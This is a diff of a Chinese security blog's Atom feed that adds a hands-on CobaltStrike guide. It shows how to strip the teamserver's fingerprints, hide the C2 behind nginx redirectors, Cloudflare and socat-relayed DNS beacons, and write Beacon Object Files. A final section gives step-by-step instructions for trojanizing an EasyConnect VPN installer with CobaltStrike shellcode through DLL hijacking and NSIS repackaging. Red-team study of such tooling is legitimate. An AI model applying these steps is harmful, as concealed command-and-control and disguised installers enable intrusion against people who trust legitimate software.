@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://chriskalix.github.io</id>
     <title>chriskali&apos;s blog</title>
-    <updated>2020-10-17T11:13:39.928Z</updated>
+    <updated>2020-10-20T14:12:54.831Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://chriskalix.github.io"/>
     <link rel="self" href="https://chriskalix.github.io/atom.xml"/>
@@ -11,15 +11,368 @@
     <icon>https://chriskalix.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, chriskali&apos;s blog</rights>
     <entry>
-        <title type="html"><![CDATA[Cobaltstrike实操]]></title>
-        <id>https://chriskalix.github.io/post/KBfNl39bU/</id>
-        <link href="https://chriskalix.github.io/post/KBfNl39bU/">
+        <title type="html"><![CDATA[CobaltStrike实操]]></title>
+        <id>https://chriskalix.github.io/post/_rdPGXVxA/</id>
+        <link href="https://chriskalix.github.io/post/_rdPGXVxA/">
         </link>
-        <updated>2020-10-17T11:01:33.000Z</updated>
+        <updated>2020-10-20T13:49:40.000Z</updated>
         <content type="html"><![CDATA[<blockquote>
-<p>Cobaltstrike入门，仅仅为了熟悉工具而已。仅记，工具只是帮助实现渗透和攻击的方法，本质不在于工具，而在于攻击思路</p>
+<p>开始日期：2020-08-14<br>
+cs版本：4.1<br>
+作者：chriskali</p>
 </blockquote>
-<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1602932799683.png" alt="" loading="lazy"></figure>
+<p>本文参考无数作者文章，以及Ateam大佬们翻译的cs中文版，不胜感激。同时今天又看到了zer0yu师傅的<a href="https://github.com/zer0yu/Awesome-CobaltStrike">Awesome-cobaltstrike</a>，一个不错的项目。<br>
+当然了，在官网上有<a href="https://www.cobaltstrike.com/training">cobaltstrike教程</a>的免费视频，作为英语练习以及cobaltstrike学习是一个不错的选择。这次的实战篇幅和上回的内网渗透入门小记有相似之处，以记录学习为主。会从我有限的实际运用角度开展，对于感兴趣的部分进行扩展和深入。希望能对于文中不当或者理解错误的地方斧正，感谢~</p>
+<blockquote>
+<p>另外的感触是，工具只是实现攻击的一种方式，我们还是要对原理性上的东西进行学习和操作</p>
+</blockquote>
+<h2 id="0x01-起手式">0x01 起手式</h2>
+<blockquote>
+<p>cobaltstrike裸跑会有一定的风险，上手之前要手工做一些预先处理</p>
+</blockquote>
+<p>注册的邮箱均为protonmail，域名由namesilo购买，cdn前置为cloudflare，访问均挂代理。当然机器也最好挂国外，由于本人偷懒...<br>
+先放一张简单的框架-工作</p>
+<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1603201890709.png" alt="" loading="lazy"></figure>
+<p>这是我的特困版本，其实雪姐有更好的版本，这里是雪姐的</p>
+<figure data-type="image" tabindex="2"><img src="https://chriskalix.github.io/post-images/1603201907368.png" alt="" loading="lazy"></figure>
+<p>当你的cs服务器未作加固，并且使用了默认的malleable c2，会有很多的特征指纹暴露在公网，下面是作者的图片</p>
+<figure data-type="image" tabindex="3"><img src="https://chriskalix.github.io/post-images/1603201954067.png" alt="" loading="lazy"></figure>
+<p>以及作者的建议</p>
+<figure data-type="image" tabindex="4"><img src="https://chriskalix.github.io/post-images/1603201981392.png" alt="" loading="lazy"></figure>
+<h3 id="证书生成">证书生成</h3>
+<blockquote>
+<p>默认配置导致keystore文件内容特征明显，容易被识别，首先先要对证书进行重新生成上线。<br>
+<strong>注</strong>：这里的证书其实只是登录时候使用的证书，不是拿来回连时候使用的证书</p>
+</blockquote>
+<p>先看一下的keystore的特征值</p>
+<figure data-type="image" tabindex="5"><img src="https://chriskalix.github.io/post-images/1603201994902.png" alt="" loading="lazy"></figure>
+<p><code>Owner</code> 和 <code>Issuer</code> 的特征很明显，固定值。我的方法是直接修改teamserver的值，然后删除原先的cobaltstrike.store即可，替换关键字为如下值</p>
+<pre><code class="language-bash">keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=051, OU=SSL-RSA, O=Baidu, L=Beijing, ST=Baidu, C=CN&quot;
+</code></pre>
+<p>到这里，我以为我修改完了，直到看到dm师傅的<a href="https://mp.weixin.qq.com/s/5MWDXN3eCaw9m-XHDGaXcQ">文章</a>......<br>
+还行，看到了悔过就不算迟。这里修改完后，其实是teamserver连接的时候用到的证书，不是https上线的时候的证书（这也太惊喜了）。上线过后的证书还是有明显的指纹特征，从dm师傅的文章中copy一下fofa的规则</p>
+<pre><code>cert=&quot;73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F&quot;
+</code></pre>
+<p>这里先提一嘴，后面肯定要自己动手去搞malleable-c2配置证书<br>
+里面有一句经典话语，我们就按照这个搭建起来...<br>
+<img src="https://chriskalix.github.io/post-images/1603202023214.png" alt="" loading="lazy"></p>
+<h3 id="监听修改">监听修改</h3>
+<p>默认的50050端口直接在teamserver里面就能进行修改（修改port即可）。<br>
+但是暴露在公网上会有明显的指纹特征被识别，所以比较好的方法是监听在本地，然后再走隧道进行访问。我的方法是监听后在云服务器上配置安全组，禁止端口访问，再通过ssh隧道进行访问。但是如果要多人作战就不大行，毕竟直接给ssh密钥也不好<br>
+其实这么修改之后呢，上面的ssl我都觉得可以不用了，反正得拨到内网里再搞</p>
+<h3 id="malleable-c2">Malleable - C2</h3>
+<blockquote>
+<p>参考项目：<a href="https://github.com/rsmudge/Malleable-C2-Profiles">官方demo</a>，<a href="https://www.cobaltstrike.com/help-malleable-c2">官方文档</a></p>
+</blockquote>
+<p>如果直接用demo的，肯定是被抓得死死的...所以我们需要有一些改动，或者寻找新奇的~在逛了一圈demo后，发现各色都有，模拟bing的，模拟gmail的形形色色。当然觉得比较通用的，还是看到先知的<a href="https://xz.aliyun.com/t/2796">这篇文章</a>，其中提到的<a href="https://github.com/threatexpress/malleable-c2">模拟jquery的项目</a>看样子还是比较通用实惠的...<br>
+项目挺好的，就是一时间暂时理解不了这么多参数，对理解的参数稍作修改后使用<code>./c2lint c2.profile</code>命令做一下预认证检查......这个我觉得比较经典，不知道被加到规则里面了没有，暂时先使用吧~<br>
+启用的命令为<code>nohup ./teamserver ipaddress password ./c2.profile&amp;</code> ，或者开到一个<code>screen</code>里面也可以</p>
+<blockquote>
+<p>20200826，我用了jquery的模板，但是cdn上线后命令执行有问题（PS：应该是我自己设置的不对），后来看到<a href="https://mp.weixin.qq.com/s/rBF7HPaV9IAVKlzaWV-9WA">文章</a>后转移到这种方法上，命令回显成功</p>
+<p>但是我也发现了，Malleable C2能自定义的东西太多了，掌握了整个Malleable C2相当于对cobaltstrike本身就有了极大的理解。所以我决定还是慢慢来...后续再为这里做补充</p>
+</blockquote>
+<p><strong>注</strong>：为了保持猥琐，我在前端转发的nginx里指定了user-agent，当user-agent不是c2.profile里写的user-agent时，会重定向至百度。当然还可以使用或者增加别的判断方法，下面为示例</p>
+<pre><code class="language-lua">server {
+        listen 8080 default_server;
+        listen [::]:8080 default_server;
+        index index.html index.htm index.nginx-debian.html;
+        server_name 你的域名;
+        location / {
+                if ($http_user_agent != &quot;指定User-Agent&quot;) {
+                        #try_files $uri $uri/ @c2;
+                        rewrite ^/(.*) http://www.baidu.com/$1 permanent;
+                }
+                try_files $uri $uri/ @c2;
+                #rewrite ^/(.*) http://www.baidu.com/$1 permanent;
+        }
+        location @c2 {
+                proxy_pass http://后端的IP以及端口;
+                proxy_redirect off;
+                proxy_ssl_verify off;
+                proxy_set_header Host $host;
+                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        }
+}
+</code></pre>
+<p>作者自己的<a href="https://www.bilibili.com/video/BV1jC4y1b7pK?p=3">第三节课</a>其实讲的非常好，我看了之后没有笔记，惭愧...</p>
+<h3 id="cdn匿名">CDN匿名</h3>
+<p>文章很多，不做搬运工。这次搭建用的是Cloudflare<br>
+（<strong>20201002更新</strong>：CloudFlare的HTTP和HTTPS端口是有限制的，下面为限制的列表）</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>支持端口</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HTTP</td>
+<td>80，8080，8880，2052，2082，2086，2095</td>
+</tr>
+<tr>
+<td>HTTPS</td>
+<td>443，2053，2083，2087，2096，8443</td>
+</tr>
+</tbody>
+</table>
+<p>有一个问题就是CF在国内的上线不稳定。不过这是一个demo版本，其实可以用aliyun的（就是需要备案...）最重要的就是配置的各个地方编写</p>
+<figure data-type="image" tabindex="6"><img src="https://chriskalix.github.io/post-images/1603202047508.png" alt="" loading="lazy"></figure>
+<p>这里的Host Header应该可以在profile里指定，这里没有直接做指定，需要重新填写，上述这个是HTTP的。需要再次提醒的是，十分不稳定，国外机器应该还可以，国内的不建议通过这种方式上线<br>
+当然也有一个比较好的博文 - <a href="https://mp.weixin.qq.com/s/rBF7HPaV9IAVKlzaWV-9WA">链接</a>。提醒了我要关闭缓存，文中提到的开发者模式会一段时间后关闭（几个小时内），所以在CF上设置一下Bypass也可以（<a href="https://www.ljchen.com/archives/1087">文章链接</a>）</p>
+<p>顺带说一下，国内的做上线可以直接用，若不想开放多个端口，则需要重写前置的nginx转发，我写了一个简单的demo做判断，如下所示。写的很简单，当然还是需要自己去做修改。</p>
+<pre><code class="language-lua">server {
+	listen 监听端口 default_server;
+	listen [::]:监听端口 default_server;
+	server_name 域名1 域名2;
+	
+	set $allow false;
+	if ($http_user_agent != &quot;指定User-Agent&quot;) { #防止一些爬虫行为，指定特殊UA过滤大部分
+		rewrite .* http://www.baidu.com/;
+	}
+	if ($host = 域名1) {
+		set $allow true;
+	}
+	if ($host = 域名2) {
+		set $allow true;
+	}
+	if ($allow = false) {
+		rewrite .* http://www.baidu.com/;
+	}
+
+	set $port 80;
+	if ($host = preview.code-jquery.net) {
+		set $port 443;
+	}
+	location / {
+		try_files $uri $uri/ @c2;
+	}
+        
+	location @c2 {
+                proxy_pass http://后端IP地址:$port;
+                proxy_redirect off;
+                proxy_ssl_verify off;
+                proxy_set_header Host $host;
+                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        }
+}
+</code></pre>
+<h3 id="dns-beacon">DNS Beacon</h3>
+<p>这个看起来花里胡哨的，网上配置很多。我讲一下自己的配置方法：<br>
+首先指定一个A记录到自己的前置服务器。然后设定2-3个NS记录，指向到自己的A记录域名。为了不暴露后端的CS机器，DNS我们也采用UDP转发，在前置机器上开启监听：<br>
+<code>socat -T 600 UDP4-LISTEN:53,reuseaddr,fork UDP4:主控机IP:5533</code><br>
+把本机的监听到的数据包转移到后端机器上。但是dns-beacon有一个小问题，很容易掉线或者超时，这个就比较痛苦了。</p>
+<figure data-type="image" tabindex="7"><img src="https://chriskalix.github.io/post-images/1603202066376.png" alt="" loading="lazy"></figure>
+<p>这里我请教了群里的<strong>xq17</strong>师傅，可能是受到插件的影响，在下线插件之后就不会出现机器掉线再回来的情况了。（后来找到了，是Erebus的modules/auxiliary.cna插件中的heartbeat_5s判断了下线和预警，其实修改之后也可以继续正常使用的）<br>
+另外听取建议后，DNS最好不要做大规模的文件传输或者网络操作，因为我看了一下每次只能252的字节传输，如果做大规模文件特征会非常明显。所以最好是用来做一些权限维持等...</p>
+<p><strong>[*]</strong> : DNS beacon有多种模式，其中默认dns模式最慢，适合维持beacon。dns-txt速率较好，可以做一些数据传输，下图为模式以及其传输的速率：</p>
+<figure data-type="image" tabindex="8"><img src="https://chriskalix.github.io/post-images/1603202076796.png" alt="" loading="lazy"></figure>
+<h3 id="ssl-证书">SSL 证书</h3>
+<p>根据这篇<a href="https://www.cnblogs.com/esofar/p/9291685.html">博文</a>可以快速配置，这里先偷个懒，暂时先用HTTP的<br>
+（之前看到过雪姐的文章，过趋势的时候还是需要的，所以埋一个小坑，这个后面回头补上，应该挺简单的）</p>
+<h3 id="端口限制-proxifier">端口限制 &amp; Proxifier</h3>
+<p>之前说过不要直接把cobaltstrike登录放在公网，防止被记录或者标识。这里用到 <a href="https://github.com/gwuhaolin/lightsocks">lightsocks</a> 项目，当然功能类似的都可以的。假设后限制直接登录的端口，转而使用socks认证再使用proxifier登录。由于内网还做了别的服务，lightsocks的账号密码泄露后还是有被shell的风险，如果有个类似于隧道的就更好了...（<strong>[*] 20200910更新</strong>：作者视频里说了，他好些客户都是ssh打隧道过去的...看来我之前想的没有错，SSH自带又安全方便，我用了额外的项目想起来有点憨憨哈哈哈哈）<br>
+当然服务开在公网，然后用iptables或者直接在云服务器上配置安全组都可以<br>
+这里需要说一下proxifier，最好最好是设定单个程序为代理。我想着的宗旨是，后端cobaltstrike的IP无论如何不能出现和暴露，如果挂了全局，在本机渗透的时候暴露了IP岂不是很可惜......<br>
+<strong>[*]</strong> 注：有能力或者团队的可以直接魔改cobaltstrike的源码，通过修改认证方式剔除指纹（...好羡慕），具体的可以搜索cobaltstrike二次开发关键字，后期慢慢补足吧~</p>
+<h2 id="0x02-部分概念知识">0x02 部分概念&amp;知识</h2>
+<blockquote>
+<p>这里包括了一些红队或者Cobalt Strike自有的知识或者概念，作为学习，这里记录一下新的知识</p>
+</blockquote>
+<h3 id="stager-stageless">Stager &amp;&amp; Stageless</h3>
+<blockquote>
+<p>应该是cobaltstrike自有的知识点吧，做一下记录。Payload Stager即传输体</p>
+</blockquote>
+<p>先上一下cs作者讲解视频的截图<br>
+<img src="https://chriskalix.github.io/post-images/1603202101370.png" alt="" loading="lazy"></p>
+<p>稍微翻译一下图片中的内容：</p>
+<ul>
+<li><strong>Stager</strong>是一个从远程下载再执行payload的小程序，通常使用在对大小有限制的情况或者环境下</li>
+<li><strong>Stageless</strong>即将payload直接打包，会比较大，但是不包含Stager</li>
+<li><strong>Stagers</strong>更加不安全，脆弱，更加容易被检测到</li>
+</ul>
+<h3 id="域前置">域前置</h3>
+<p>暂略</p>
+<h3 id="spawn">Spawn</h3>
+<h4 id="msf">Msf</h4>
+<p>通常情况下，我们需要将cobaltstrike的payload派生到msf上，这里自己踩到了一个小坑，看了一下视频。需要先<br>
+<code>set prependmigrate true 以及 set DisablePayloadHandler True</code><br>
+不然功能回连有问题，附上作者的截图</p>
+<figure data-type="image" tabindex="9"><img src="https://chriskalix.github.io/post-images/1603202120587.png" alt="" loading="lazy"></figure>
+<h3 id="bofs">BOFs</h3>
+<blockquote>
+<p>BOFs是cobaltstrike 4.1 下的新的功能，官方链接<a href="https://www.cobaltstrike.com/help-beacon-object-files">如下</a>，在官方链接中已经对BOF有比较详细的解释，下面稍作翻译和学习</p>
+</blockquote>
+<blockquote>
+<p>我认为这一部分非常有意思且实用，在github上搜索BOF关键字也已经有一些不错的项目，但是这一部分需要有win32和c开发的基础，对于我来说实现一些简单的功能也存在一定的难度（太菜了，列入长期的学习计划ing）</p>
+</blockquote>
+<h4 id="什么是bofs">什么是BOFs</h4>
+<p>​		BOF(Beacon Object File)是一个已编译的C程序，按照一定的约定编写后，它可以在Beacon内执行并且调用Beacon内部的API。BOFs是一个能让Beacon拥有新的后渗透功能的方法</p>
+<h4 id="bofs的优势">BOFs的优势</h4>
+<p>​		C2平台的关键作用之一是提供外部的后渗透功能。Cobalt Strike 已经有能使用 Powershell，.NET，Reflective DLLs 的工具。这些工具依赖昂贵的OPSEC fork&amp;run模式，该模式包含对后渗透动作的进程创建和注入。并且BOF的痕迹更小，在Beacon内部执行，执行完毕后清除。<br>
+​		BOF的提及很小。例如一个UAC bypass权限提升的反射型DLL实现的大小会超过100KB，但是如果使用BOF仅会小于3KB。如果在带宽有限制的情况（例如DNS隧道），那么会有巨大的提升。<br>
+​		最后，BOFs的开发比较容易。你只需要Win32 的C编译器和一行命令。MinGW和Microsoft C编译器都可以生成BOF文件，不必为配置而大费周章。<br>
+​		<strong>[*]</strong> ：我也找到了一篇讲的不错的<a href="https://www.trustedsec.com/blog/a-developers-introduction-to-beacon-object-files/">文章</a>，可以帮助我们更好的理解 BOF 的优劣和特点</p>
+<h4 id="bof如何工作">BOF如何工作</h4>
+<p>​		对于Beacon而言，一个BOF只是一段与位置无关的，接收指向Beacon内部指针的代码。<br>
+​		对于Cobalt Strike，Beacon是由C编译的对象文件。Cobalt Strike解析这个文件，并且充当其内容的连接器和加载器。这个方法可以让你编写一段地址无关代码，在Beacon中使用并且动态调用Win32 APIs。</p>
+<h4 id="bofs的劣势">BOFs的劣势</h4>
+<p>​		BOFs是一个调用Win32 APIs和一些Beacon APIs的单文件C程序。不要期望以这种机制去连接其他功能或者构建大型项目。<br>
+​		Cobalt Strike不会链接你的BOF到libc上，这意味着你仅能使用编译器的内部函数（例如Visual Studio中的memset -&gt; __stosb），公开的Beacon内部APIs，Win32 APIs以及自定义函数。所以由很多常见的函数（例如strlen，stcmp等等）将无法使用。<br>
+​		BOFs在Beacon内部执行，如果BOF程序崩溃了，你将会失去你的Beacon。所以，写BOFs的时候请小心一点。<br>
+​		CobaltStrike期望BOFs是一个运行时间短的单线程程序。BOFs会阻止Beacon的其他任务和执行。BOF没有异步或者长时间运行的模式，如果想要运行一个运行时间较长的，考虑使用<strong>反射DLL</strong></p>
+<h4 id="如何开发bof">如何开发BOF</h4>
+<blockquote>
+<p>终于到了关键部分！到这里加一些自己的理解和笔记了</p>
+</blockquote>
+<p>打开IDE，写一个C程序，下面的Hello World的BOF：</p>
+<pre><code class="language-c">#include &lt;windows.h&gt;
+#include &quot;beacon.h&quot;
+
+void go(char * args, int alen) {
+      BeaconPrintf(CALLBACK_OUTPUT, &quot;Hello World: %s&quot;, args);
+}
+</code></pre>
+<p>下载<a href="https://www.cobaltstrike.com/downloads/beacon.h">beacon.h</a>（会用到的）<br>
+在VS中，的编译语句：<br>
+<strong>cl.exe /c /GS- hello.c /Fohello.o</strong><br>
+在MinGW中的编译语句：<br>
+<strong>x86_64-w64-mingw32-gcc -c hello.c -o hello.o</strong><br>
+上述语句都会生成一个hello.o文件，用inline-execute语句在Beacon中执行，执行方法如下：<br>
+<strong>beacon&gt; inline-execute /path/to/hello/o these are arguments</strong><br>
+截个图，如下所示：</p>
+<figure data-type="image" tabindex="10"><img src="https://chriskalix.github.io/post-images/1603202141298.png" alt="" loading="lazy"></figure>
+<p>beacon.h定义了一些内部Beacon APIs。这个go函数，类似于C当中的main，这个函数被inline-execute调用并传参，BeaconOutput是一个将输出传给操作者的内部Beacon API，没什么特别的。</p>
+<h4 id="动态函数解析">动态函数解析</h4>
+<p>​		<code>GetProcAddress</code>，<code>LoadLibraryA</code>，<code>GetModuleHandle</code>，以及<code>FreeLibrary</code> 都可以在BOF文件中使用。你可以选择用这些函数去动态解析要调用的Win32 APIs。另外的一个选项是使用 Dynamic Function Resolution（DFR即动态函数解析）<br>
+​		DRF是一个将Win32 APIs 申明和调用为 LIBRARY$Function 的约定。此约定为Beacon提供了显式解析特定函数所需的信息，并使其在运行前可用于您的BOF文件。当此过程失败时，Cobalt Strike将拒绝执行BOF，并告诉您它无法解析哪个函数。<br>
+​		下面是一个BOF使用DFR查找当前域的示例：</p>
+<pre><code class="language-c">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;dsgetdc.h&gt;
+#include &quot;beacon.h&quot;
+
+DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameA(LPVOID, LPVOID, LPVOID, LPVOID, ULONG, LPVOID);
+DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);
+void go(char * args, int alen) {
+	DWORD dwRet;
+	PDOMAIN_CONTROLLER_INFO pdcInfo;
+	dwRet = NETAPI32$DsGetDcNameA(NULL, NULL, NULL, NULL, 0, &amp;pdcInfo);
+	if (ERROR_SUCCESS == dwRet) {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;%s&quot;, pdcInfo-&gt;DomainName);
+	}
+	NETAPI32$NetApiBufferFree(pdcInfo);
+}
+</code></pre>
+<p>​		上述代码使用DRF，从 <code>NETAPI32</code> 调用 <code>DsGetDcNameA</code> 和 <code>NetApiBufferFree</code>。当声明动态函数解析的函数原型时，请密切注意函数声明附带的修饰符。诸如WINAPI和 <code>DECLSPEC_IMPORT</code> 之类的关键字很重要。这些修饰为编译器提供了必要的提示，以传递参数并生成正确的调用指令。</p>
+<h4 id="aggressor-script-和-bofs">Aggressor Script 和 BOFs</h4>
+<p>​		BOF在Cobalt Strike中的最终应用可能才是最关键的。BOF是用来横向移动，权限提升或者侦察非常好的方法。<br>
+​		<code>&amp;beacon_inline_execute</code> 函数是Aggressor Script运行BOF函数的入口点。下面是一个实例程序：</p>
+<pre><code class="language-aggressor">alias hello {
+	local('$barch $handle $data $args');
+	
+	# figure out the arch of this session
+	$barch  = barch($1);
+	
+	# read in the right BOF file
+	$handle = openf(script_resource(&quot;hello. $+ $barch $+ .o&quot;));
+	$data   = readb($handle, -1);
+	closef($handle);
+	
+	# pack our arguments
+	$args   = bof_pack($1, &quot;zi&quot;, &quot;Hello World&quot;, 1234);
+	
+	# announce what we're doing
+	btask($1, &quot;Running Hello BOF&quot;);
+	
+	# execute it.
+	beacon_inline_execute($1, $data, &quot;demo&quot;, $args);
+}
+</code></pre>
+<p>​		首先会找到该Beacon的架构，根据架构执行。<code>&amp;bof_pack</code> 函数将参数打包成 Beacon 内部数据解析 API 相兼容。脚本用 <code>&amp;btask</code> 记录 Beacon 所执行的操作，用 <code>&amp;beacon_inline_execute</code> 运行BOF。<br>
+​		<code>&amp;beacon_inline_execute</code> 函数接收 Beacon ID 作为第一个参数，一串包含 BOF 内容的字符串作为第二个参数，入口点作为第三个参数，打包参数作为第四个参数。选择带有入口点的适用于组合类函数至单个BOF（这翻译的我也很困惑）</p>
+<h3 id="external-c2">External C2</h3>
+<blockquote>
+<p>什么是External C2?为什么要External C2?简而言之，用户可以自定义通讯的方式，而不是固定的HTTP/HTTPS/SMB/DNS这种内置的通讯方式</p>
+</blockquote>
+<p>基本结构图</p>
+<figure data-type="image" tabindex="11"><img src="https://chriskalix.github.io/post-images/1603202176172.png" alt="" loading="lazy"></figure>
+<p>基本搜External C2都会看到这个图（我是在这个<a href="https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/">博客</a>里看到的），这个图已经解释的比较清楚了，本地通过监听External C2 port，自实现的server段与Team Server通讯，client段通过命名管道，与Server段进行自定义通讯，其工作的内容和方式如下图所示（从这篇<a href="https://rcoil.me/2019/10/%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91Cobalt%20Strike%20%E7%9A%84%20ExternalC2/">博客</a>里搬运而来）</p>
+<figure data-type="image" tabindex="12"><img src="./ExternalC2.svg" alt="" loading="lazy"></figure>
+<p>但是这个玩意的资料比较少，大部分都是大家写的几个demo，同样的还是给自己先挖个坑，后面会回过头来全部补上的。<br>
+另外今天看到倾旋的<a href="https://github.com/Rvn0xsy/Cooolis-ms">Cooolis-ms</a>中也有用到了externalc2，不过好像没有写通信的加解密，但仍是一个很好的应用</p>
+<h3 id="browser-piovting">Browser Piovting</h3>
+<blockquote>
+<p>该部分的功能为：让你挂一个代理，即可像在受害机上一样浏览网站。我认为使用场景为：拿下一台个人主机后，访问邮箱，OA等系统，而不用抓取密码再次登录等。当然，神奇的雪姐早就在博客里发过<a href="http://blog.leanote.com/post/snowming/4e07af1cab60">文章</a>了。</p>
+</blockquote>
+<p>这个功能刚开始认为非常好使，于是匆匆去测试发现好多并不能行，一番搜索后找到雪姐的博客开始看了起来...</p>
+<figure data-type="image" tabindex="13"><img src="https://chriskalix.github.io/post-images/1603202279683.png" alt="" loading="lazy"></figure>
+<h4 id="实现原理">实现原理</h4>
+<blockquote>
+<p>这一部分为了理解，照着雪姐的博客我看了一遍</p>
+</blockquote>
+<p>于socks代理不同，socks代理仅使用客户端作为代理，无法使用客户端已有的凭据。</p>
+<ol>
+<li>进程注入：这个就是为什么在点击Brower Pivot后会让我们先选择进程，选择后会向目标进程注入一个 agent</li>
+<li>服务器上创建代理，请求代理的时候会转变成agent的请求</li>
+<li>agent转化将请求转化为 <code>WinINet</code> 库的 API 调用。（雪姐的博客里对这个讲的更加详细，实现的原理也是主要依赖 WinINet 这个库，但是这方面我不了解，就不做搬运工了）</li>
+<li><strong>关键</strong>：为什么不能注入 Edge，Chrome等，只能注入 IE 呢？因为 IE 浏览器用于 web 通信也是使用WinINet进行身份认证管理。</li>
+</ol>
+<h4 id="局限性使用">局限性&amp;使用</h4>
+<blockquote>
+<p>我认为这个只能用于一些比较特殊的场景。对方使用 IE 浏览器，且存在 IE 进程。唯一的优势是若存在这样的场景，可以避免二次登录。</p>
+</blockquote>
+<p>使用：注入 IE 浏览器的 x86 进程，一般情况下可以注入的进程 cobaltstrike 会在后面 ✔</p>
+<h3 id="权限提升">权限提升</h3>
+<blockquote>
+<p>这一部分在 内网渗透入门 篇章中以及提及过一小部分，这里主要是记录和学习作者视频中的内容</p>
+</blockquote>
+<p>这里需要区分的是 Administrator 权限与 System权限。前者为管理员权限，后者为系统权限，在操作一些，如SAM时，需要以System权限运行。</p>
+<figure data-type="image" tabindex="14"><img src="https://chriskalix.github.io/post-images/1603202288535.png" alt="" loading="lazy"></figure>
+<p>如果需要使用其他脚本，可以使用 taowu 或者作者自己的 <a href="https://github.com/rsmudge/ElevateKit.git">ElevateKit</a>，以及作者推荐的PowerUp</p>
+<h1 id="额外篇之蓝队反制">额外篇之蓝队反制</h1>
+<blockquote>
+<p>额外加餐</p>
+</blockquote>
+<h2 id="手动构造安装包">手动构造安装包</h2>
+<blockquote>
+<p>操作的 handbook 均来自<a href="https://mp.weixin.qq.com/s/LNQXs3Aq_9xyVQPK60xxaw">零队文章</a>，但是在实际构造和实践的时候还是踩坑了，赶紧记录，防止二次踩坑</p>
+</blockquote>
+<h3 id="准备材料">准备材料</h3>
+<ol>
+<li>DLL注入工具（拿破轮胎）</li>
+<li>NSIS</li>
+<li>EasyConnect（或者其他安装程序）</li>
+</ol>
+<p>**[*] 不足点：**由于原理上的理解和实践还不够，DLL注入工具只能先用现成的，shellcode也是没有混淆的。如果后续不能免杀了，应该修改cobaltstrike源码的shellcode（现成文章的有xor简单混淆一下），然后自己实现DLL注入，这是这次实践中自己发现的不足点。在写完这一篇后我会</p>
+<h3 id="开始动手">开始动手</h3>
+<ol>
+<li>首先，安装完毕EasyConnect，不用任何操作，安装就行</li>
+<li>用cobaltstrike的C payload，使用DLL注入工具生成一个 <code>wwwcomw.dll</code> 和 <code>conf.inf</code></li>
+<li>将两个文件放置到执行的目录下，例如 easyConnect执行的客户端文件实际在  <code>C:\Program Files\Sangfor\SSL\SangforCSClient</code> （我的主机上是这样的）。然后使用DLL注入工具劫持执行的exe文件，easyconnect为<code>SangforCSClient.exe</code> 。</li>
+<li>作为测试，直接双击启动发现成功上线，代表成功<br>
+<strong>------------- 准备打包------------</strong></li>
+<li>打包工具是NSIS，零队这里跳过了，其实我踩的坑都在这里5555<br>
+第一步选择可视化脚本编辑器</li>
+</ol>
+<figure data-type="image" tabindex="15"><img src="https://chriskalix.github.io/post-images/1603202301339.png" alt="" loading="lazy"></figure>
+<p>​		选择 使用脚本想到创建新的脚本文件</p>
+<figure data-type="image" tabindex="16"><img src="https://chriskalix.github.io/post-images/1603202310773.png" alt="" loading="lazy"></figure>
+<p>​		这里需要修改程序名称以及版本等等，这些信息会在安装的时候出现，所以不要乱填（这里版本是乱填的）</p>
+<figure data-type="image" tabindex="17"><img src="https://chriskalix.github.io/post-images/1603202352491.png" alt="" loading="lazy"></figure>
+<p>​		修改掉ico，这个是安装程序的ico</p>
+<figure data-type="image" tabindex="18"><img src="https://chriskalix.github.io/post-images/1603202366245.png" alt="" loading="lazy"></figure>
+<p>​			继续下一步，做图中内容的修改</p>
+<figure data-type="image" tabindex="19"><img src="https://chriskalix.github.io/post-images/1603202375644.png" alt="" loading="lazy"></figure>
+<p>​		修改目录，包含所有文件</p>
+<figure data-type="image" tabindex="20"><img src="https://chriskalix.github.io/post-images/1603202403213.png" alt="" loading="lazy"></figure>
+<p>​			这里就是坑点了，虽然说这里有添加快捷方式，但是我自己是添加不上的（暂时不知道原因），这也是导致我花费了比较多时间的			原因</p>
+<figure data-type="image" tabindex="21"><img src="https://chriskalix.github.io/post-images/1603202418754.png" alt="" loading="lazy"></figure>
+<p>​		之后就一直下一步，我们看到脚本，这里有我们需要修改的地方（快捷方式）</p>
+<figure data-type="image" tabindex="22"><img src="https://chriskalix.github.io/post-images/1603202425983.png" alt="" loading="lazy"></figure>
+<p>​		这里我们需要修改二个地方，1为起始位置，2是目标<br>
+​		设置起始位置的语法为：<code>SetOutPath &quot;$INSTDIR&quot;</code>，但是这里默认的是安装的目录，查看完原本的EasyConnect文件，修改为 <code>SetOutPath $INSTDIR\SSL\SangforCSClient</code><br>
+​		创建目标的语法为：<code>CreateShortCut $Desktop\EasyConnect.lnk $INSTDIR\...自己填.exe &quot;/要执行的命令&quot;</code>按照这个模板，直接填写即可，填写完毕后F9编译加运行，完毕后弹出740错误没关系，因为你权限不够。自己手动点开有UAC，安装后双击即可上线</p>
 ]]></content>
     </entry>
     <entry>
@@ -28,8 +381,7 @@
         <link href="https://chriskalix.github.io/post/bKTmLyJeL/">
         </link>
         <updated>2020-09-29T16:13:11.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="记一次手工钓鱼">记一次手工钓鱼</h1>
-<blockquote>
+        <content type="html"><![CDATA[<blockquote>
 <p>记得去年差不多也是这个时候，和同事配合了一次钓鱼，最后因为payload有些错误加上他的离职，这个事情也就匆匆告一段落了（说起来还有点怀念并肩作战的日子）。如今又有了钓鱼的需求，于是记录一下这次从外网打点开始的钓鱼之旅。</p>
 </blockquote>
 <h2 id="目标制定">目标制定</h2>
